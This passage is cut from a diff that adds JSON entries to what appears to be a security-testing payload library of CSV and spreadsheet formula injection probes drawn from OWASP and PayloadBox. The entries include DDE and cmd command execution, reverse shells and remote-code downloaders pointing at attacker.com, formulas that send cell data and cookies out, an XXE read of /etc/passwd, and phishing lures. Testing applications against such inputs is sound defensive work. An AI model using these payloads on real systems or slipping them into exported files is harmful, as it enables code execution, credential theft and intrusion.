+    "template": "=DDE(\"cmd\";",
+    "description": "Line breaks probe from OWASP. Tests application handling of: =DDE(\"cmd\";",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0083",
+    "name": "Line breaks #2",
+    "template": "\"/c calc\";",
+    "description": "Line breaks probe from OWASP. Tests application handling of: \"/c calc\";",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0084",
+    "name": "Line breaks #3",
+    "template": "\"!\")",
+    "description": "Line breaks probe from OWASP. Tests application handling of: \"!\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0085",
+    "name": "Tabs and spaces",
+    "template": "=DDE(\t\"cmd\"\t;\t\"/c calc\"\t;\t\"!\"\t)",
+    "description": "Tabs and spaces probe from OWASP. Tests application handling of: =DDE(\t\"cmd\"\t;\t\"/c calc\"\t;\t\"!\"\t...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0086",
+    "name": "Windows",
+    "template": "=cmd|'/c calc'!A1",
+    "description": "Windows probe from OWASP. Tests application handling of: =cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "csv-injection-payloads.txt, csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0087",
+    "name": "Windows #2",
+    "template": "=cmd|'/c powershell -c \"Start-Process calc\"'!A1",
+    "description": "Windows probe from OWASP. Tests application handling of: =cmd|'/c powershell -c \"Start-...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0088",
+    "name": "Windows #3",
+    "template": "=cmd|'/c mshta http://attacker.com/payload.hta'!A1",
+    "description": "Windows probe from OWASP. Tests application handling of: =cmd|'/c mshta http://attacker...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0089",
+    "name": "Windows #4",
+    "template": "=cmd|'/c certutil -urlcache -split -f http://attacker.com/bad.exe bad.exe && bad.exe'!A1",
+    "description": "Windows probe from OWASP. Tests application handling of: =cmd|'/c certutil -urlcache -s...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0090",
+    "name": "Windows #5",
+    "template": "=cmd|'/c wmic process call create \"calc.exe\"'!A1",
+    "description": "Windows probe from OWASP. Tests application handling of: =cmd|'/c wmic process call cre...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0091",
+    "name": "Windows #6",
+    "template": "=cmd|'/c reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall'!A1",
+    "description": "Windows probe from OWASP. Tests application handling of: =cmd|'/c reg query HKLM\\SOFTWA...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0092",
+    "name": "Linux/Unix",
+    "template": "=SHELL(\"xcalc\")",
+    "description": "Linux/Unix probe from OWASP. Tests application handling of: =SHELL(\"xcalc\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0093",
+    "name": "Linux/Unix #2",
+    "template": "=SHELL(\"xterm\")",
+    "description": "Linux/Unix probe from OWASP. Tests application handling of: =SHELL(\"xterm\")",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0094",
+    "name": "Linux/Unix #3",
+    "template": "=SHELL(\"/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\")",
+    "description": "Linux/Unix probe from OWASP. Tests application handling of: =SHELL(\"/bin/bash -i >& /dev/t...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0095",
+    "name": "Linux/Unix #4",
+    "template": "=SHELL(\"curl http://attacker.com/shell.sh | bash\")",
+    "description": "Linux/Unix probe from OWASP. Tests application handling of: =SHELL(\"curl http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0096",
+    "name": "Linux/Unix #5",
+    "template": "=SHELL(\"nc attacker.com 4444 -e /bin/sh\")",
+    "description": "Linux/Unix probe from OWASP. Tests application handling of: =SHELL(\"nc attacker.com 4444 -...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0097",
+    "name": "macOS",
+    "template": "=SHELL(\"open /Applications/Calculator.app\")",
+    "description": "macOS probe from OWASP. Tests application handling of: =SHELL(\"open /Applications/Cal...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0098",
+    "name": "macOS #2",
+    "template": "=SHELL(\"osascript -e 'tell application \\\"Calculator\\\" to activate'\")",
+    "description": "macOS probe from OWASP. Tests application handling of: =SHELL(\"osascript -e 'tell app...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0099",
+    "name": "macOS #3",
+    "template": "=SHELL(\"curl http://attacker.com/payload.sh | sh\")",
+    "description": "macOS probe from OWASP. Tests application handling of: =SHELL(\"curl http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0100",
+    "name": "Exfiltrate cell data",
+    "template": "=WEBSERVICE(\"http://attacker.com?data=\"&A1)",
+    "description": "Exfiltrate cell data probe from OWASP. Tests application handling of: =WEBSERVICE(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0101",
+    "name": "Exfiltrate cell data #2",
+    "template": "=HYPERLINK(\"http://attacker.com?token=\"&B2,\"Update\")",
+    "description": "Exfiltrate cell data probe from OWASP. Tests application handling of: =HYPERLINK(\"http://attacker.co...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0102",
+    "name": "Exfiltrate cell data #3",
+    "template": "=IMAGE(\"http://attacker.com/track.gif?user=\"&C3)",
+    "description": "Exfiltrate cell data probe from OWASP. Tests application handling of: =IMAGE(\"http://attacker.com/tr...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0103",
+    "name": "Exfiltrate multiple cells",
+    "template": "=WEBSERVICE(\"http://attacker.com?u=\"&A1&\"&p=\"&B1)",
+    "description": "Exfiltrate multiple cells probe from OWASP. Tests application handling of: =WEBSERVICE(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0104",
+    "name": "Exfiltrate multiple cells #2",
+    "template": "=CONCATENATE(\"http://attacker.com/\",A1,\"/\",B1,\"/\",C1)",
+    "description": "Exfiltrate multiple cells probe from OWASP. Tests application handling of: =CONCATENATE(\"http://attacker....",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0105",
+    "name": "Resource exhaustion",
+    "template": "=SUM(1:1048576)",
+    "description": "Resource exhaustion probe from OWASP. Tests application handling of: =SUM(1:1048576)",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0106",
+    "name": "Resource exhaustion #2",
+    "template": "=IF(A1<>\"\",$A$1:$XFD$1048576,\"\")",
+    "description": "Resource exhaustion probe from OWASP. Tests application handling of: =IF(A1<>\"\",$A$1:$XFD$1048576,\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0107",
+    "name": "Resource exhaustion #3",
+    "template": "=VLOOKUP(A1,$A$1:$XFD$1048576,1,FALSE)",
+    "description": "Resource exhaustion probe from OWASP. Tests application handling of: =VLOOKUP(A1,$A$1:$XFD$1048576,...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0108",
+    "name": "Circular references",
+    "template": "=A1",
+    "description": "Circular references probe from OWASP. Tests application handling of: =A1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0109",
+    "name": "Remote File Inclusion",
+    "template": "=IMPORTHTML(\"http://attacker.com/malicious.html\",\"table\",1)",
+    "description": "Remote File Inclusion probe from OWASP. Tests application handling of: =IMPORTHTML(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0110",
+    "name": "Remote File Inclusion #2",
+    "template": "=IMPORTFEED(\"http://attacker.com/rss\")",
+    "description": "Remote File Inclusion probe from OWASP. Tests application handling of: =IMPORTFEED(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0111",
+    "name": "Remote File Inclusion #3",
+    "template": "=IMPORTDATA(\"http://attacker.com/data.txt\")",
+    "description": "Remote File Inclusion probe from OWASP. Tests application handling of: =IMPORTDATA(\"http://attacker.c...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0112",
+    "name": "XXE via CSV (when parsed as XML internally)",
+    "template": "=IMPORTXML(\"data:text/xml,<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>\",\"//foo\")",
+    "description": "XXE via CSV (when parsed as XML internally) probe from OWASP. Tests application handling of: =IMPORTXML(\"data:text/xml,<!DO...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0113",
+    "name": "Social Engineering Payloads",
+    "template": "Please verify your account: =HYPERLINK(\"http://phishing.com\",\"Click Here\")",
+    "description": "Social Engineering Payloads probe from OWASP. Tests application handling of: Please verify your account: =H...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0114",
+    "name": "Social Engineering Payloads #2",
+    "template": "Congratulations! You won: =DDE(\"cmd\";\"/c calc\";\"!\")",
+    "description": "Social Engineering Payloads probe from OWASP. Tests application handling of: Congratulations! You won: =DDE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0115",
+    "name": "Social Engineering Payloads #3",
+    "template": "URGENT - Security Update Required =cmd|'/c powershell iex(wget attacker.com/malware.ps1)'!A1",
+    "description": "Social Engineering Payloads probe from OWASP. Tests application handling of: URGENT - Security Update Requi...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0116",
+    "name": "Social Engineering Payloads #4",
+    "template": "Invoice #12345 =WEBSERVICE(\"http://attacker.com/log\")",
+    "description": "Social Engineering Payloads probe from OWASP. Tests application handling of: Invoice #12345 =WEBSERVICE(\"ht...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0117",
+    "name": "Polyglot Payloads",
+    "template": "=1+1';alert(document.domain)//",
+    "description": "Polyglot Payloads probe from OWASP. Tests application handling of: =1+1';alert(document.domain)//",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0118",
+    "name": "Polyglot Payloads #2",
+    "template": "=DDE(\"cmd\";\"/c calc\";\"!\")||'<script>alert(1)</script>",
+    "description": "Polyglot Payloads probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c calc\";\"!\")||'<s...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0119",
+    "name": "Polyglot Payloads #3",
+    "template": "+cmd|'/c calc'!A1'\"><img src=x onerror=alert(1)>",
+    "description": "Polyglot Payloads probe from OWASP. Tests application handling of: +cmd|'/c calc'!A1'\"><img src=x...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0120",
+    "name": "Null Cell Reference",
+    "template": "=A0",
+    "description": "Null Cell Reference probe from OWASP. Tests application handling of: =A0",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0121",
+    "name": "Null Cell Reference #2",
+    "template": "=DDE(\"cmd\";\"/c calc\";\"!\")!A0",
+    "description": "Null Cell Reference probe from OWASP. Tests application handling of: =DDE(\"cmd\";\"/c calc\";\"!\")!A0",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0122",
+    "name": "Null Cell Reference #3",
+    "template": "=cmd|'/c powershell'!A0",
+    "description": "Null Cell Reference probe from OWASP. Tests application handling of: =cmd|'/c powershell'!A0",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0123",
+    "name": "Format Confusion",
+    "template": "\"=1+1\"",
+    "description": "Format Confusion probe from OWASP. Tests application handling of: \"=1+1\"",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0124",
+    "name": "Format Confusion #2",
+    "template": "'=1+1",
+    "description": "Format Confusion probe from OWASP. Tests application handling of: '=1+1",
+    "enabled": true,
+    "sourceType": "OWASP, PayloadBox",
+    "sourceFile": "csv-injection-payloads.txt, csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0125",
+    "name": "Format Confusion #3",
+    "template": "`=1+1",
+    "description": "Format Confusion probe from OWASP. Tests application handling of: `=1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0126",
+    "name": "Format Confusion #4",
+    "template": "\u00b4=1+1",
+    "description": "Format Confusion probe from OWASP. Tests application handling of: \u00b4=1+1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0127",
+    "name": "First row normal, second row malicious",
+    "template": "Normal User,user@email.com,Regular Comment",
+    "description": "First row normal, second row malicious probe from OWASP. Tests application handling of: Normal User,user@email.com,Reg...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0128",
+    "name": "First row normal, second row malicious #2",
+    "template": "Hacker,=DDE(\"cmd\";\"/c calc\";\"!\"),Malicious",
+    "description": "First row normal, second row malicious probe from OWASP. Tests application handling of: Hacker,=DDE(\"cmd\";\"/c calc\";\"!...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0129",
+    "name": "In URL parameters",
+    "template": "?name==DDE(\"cmd\";\"/c calc\";\"!\")",
+    "description": "In URL parameters probe from OWASP. Tests application handling of: ?name==DDE(\"cmd\";\"/c calc\";\"!\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0130",
+    "name": "In URL parameters #2",
+    "template": "?search=+cmd|'/c calc'!A1",
+    "description": "In URL parameters probe from OWASP. Tests application handling of: ?search=+cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0131",
+    "name": "In JSON (if converted to CSV)",
+    "template": "{\"name\": \"=DDE(\\\"cmd\\\";\\\"/c calc\\\";\\\"!\\\")\"}",
+    "description": "In JSON (if converted to CSV) probe from OWASP. Tests application handling of: {\"name\": \"=DDE(\\\"cmd\\\";\\\"/c ca...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0132",
+    "name": "In XML (if converted to CSV)",
+    "template": "<name>=cmd|'/c calc'!A1</name>",
+    "description": "In XML (if converted to CSV) probe from OWASP. Tests application handling of: <name>=cmd|'/c calc'!A1</name>",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0133",
+    "name": "Time-Delayed Payloads",
+    "template": "=IF(NOW()>DATE(2024,1,1),DDE(\"cmd\";\"/c calc\";\"!\"),1)",
+    "description": "Time-Delayed Payloads probe from OWASP. Tests application handling of: =IF(NOW()>DATE(2024,1,1),DDE(\"...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0134",
+    "name": "Time-Delayed Payloads #2",
+    "template": "=IF(TODAY()=WEEKDAY(1),WEBSERVICE(\"http://attacker.com\"),1)",
+    "description": "Time-Delayed Payloads probe from OWASP. Tests application handling of: =IF(TODAY()=WEEKDAY(1),WEBSERV...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0135",
+    "name": "When exported from web applications",
+    "template": "=WEBSERVICE(CONCAT(\"http://attacker.com/?cookie=\",CELL(\"filename\")))",
+    "description": "When exported from web applications probe from OWASP. Tests application handling of: =WEBSERVICE(CONCAT(\"http://att...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0136",
+    "name": "When exported from web applications #2",
+    "template": "=HYPERLINK(\"javascript:alert(document.cookie)\",\"click\")",
+    "description": "When exported from web applications probe from OWASP. Tests application handling of: =HYPERLINK(\"javascript:alert(d...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-owasp-0137",
+    "name": "When exported from web applications #3",
+    "template": "=@SUM(A1:A1000)*WEBSERVICE(\"http://attacker.google.com\")",
+    "description": "When exported from web applications probe from OWASP. Tests application handling of: =@SUM(A1:A1000)*WEBSERVICE(\"ht...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "csv-injection-payloads.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0001",
+    "name": "Csv Injection Intruder #1",
+    "template": "=SUM(A1:A10)",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =SUM(A1:A10)",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0002",
+    "name": "Csv Injection Intruder #2",
+    "template": "@SUM(1+1)",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @SUM(1+1)",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0003",
+    "name": "Csv Injection Intruder #3",
+    "template": "=1+1+cmd|'/c calc'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =1+1+cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0004",
+    "name": "Csv Injection Intruder #4",
+    "template": "=cmd|'/c calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0005",
+    "name": "Csv Injection Intruder #5",
+    "template": "=cmd|'/C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0006",
+    "name": "Csv Injection Intruder #6",
+    "template": "=cmd|'/C notepad'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/C notepad'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0007",
+    "name": "Csv Injection Intruder #7",
+    "template": "=cmd|'/C notepad'!'A1'",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/C notepad'!'A1'",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0008",
+    "name": "Csv Injection Intruder #8",
+    "template": "=cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0009",
+    "name": "Csv Injection Intruder #9",
+    "template": "=cmd|' /C notepad'!'A1'",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|' /C notepad'!'A1'",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0010",
+    "name": "Csv Injection Intruder #10",
+    "template": "@SUM(1+9)*cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @SUM(1+9)*cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0011",
+    "name": "Csv Injection Intruder #11",
+    "template": "=10+20+cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =10+20+cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0012",
+    "name": "Csv Injection Intruder #12",
+    "template": "=cmd|'/c ping 127.0.0.1'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c ping 127.0.0.1'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0013",
+    "name": "Csv Injection Intruder #13",
+    "template": "=cmd|'/c whoami'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c whoami'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0014",
+    "name": "Csv Injection Intruder #14",
+    "template": "=cmd|'/c ipconfig'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c ipconfig'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0015",
+    "name": "Csv Injection Intruder #15",
+    "template": "DDE (\"cmd\";\"/C calc\";\"!A0\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: DDE (\"cmd\";\"/C calc\";\"!A0\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0016",
+    "name": "Csv Injection Intruder #16",
+    "template": "DDE(\"cmd\";\"/C calc\";\"!A0\")A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: DDE(\"cmd\";\"/C calc\";\"!A0\")A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0017",
+    "name": "Csv Injection Intruder #17",
+    "template": "=DDE(\"cmd\";\"/C calc\";\"!A0\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =DDE(\"cmd\";\"/C calc\";\"!A0\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0018",
+    "name": "Csv Injection Intruder #18",
+    "template": "@DDE(\"cmd\";\"/C calc\";\"!A0\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @DDE(\"cmd\";\"/C calc\";\"!A0\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0019",
+    "name": "Csv Injection Intruder #19",
+    "template": "+DDE(\"cmd\";\"/C calc\";\"!A0\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: +DDE(\"cmd\";\"/C calc\";\"!A0\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0020",
+    "name": "Csv Injection Intruder #20",
+    "template": "-DDE(\"cmd\";\"/C calc\";\"!A0\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: -DDE(\"cmd\";\"/C calc\";\"!A0\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0021",
+    "name": "Csv Injection Intruder #21",
+    "template": "=cmd|'/C powershell IEX(wget http://attacker.com/shell.ps1)'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/C powershell IEX(wget http://attacker.com/shell.ps1)'...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0022",
+    "name": "Csv Injection Intruder #22",
+    "template": "=cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadSt...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0023",
+    "name": "Csv Injection Intruder #23",
+    "template": "=cmd|'/c certutil -urlcache -split -f http://attacker.com/payload.exe C:\\temp\\payload.exe'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c certutil -urlcache -split -f http://attacker.com/pa...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0024",
+    "name": "Csv Injection Intruder #24",
+    "template": "=cmd|'/c bitsadmin /transfer job http://attacker.com/payload.exe C:\\temp\\payload.exe'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c bitsadmin /transfer job http://attacker.com/payload...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0025",
+    "name": "Csv Injection Intruder #25",
+    "template": "=cmd|'/c mshta http://attacker.com/payload.hta'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c mshta http://attacker.com/payload.hta'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
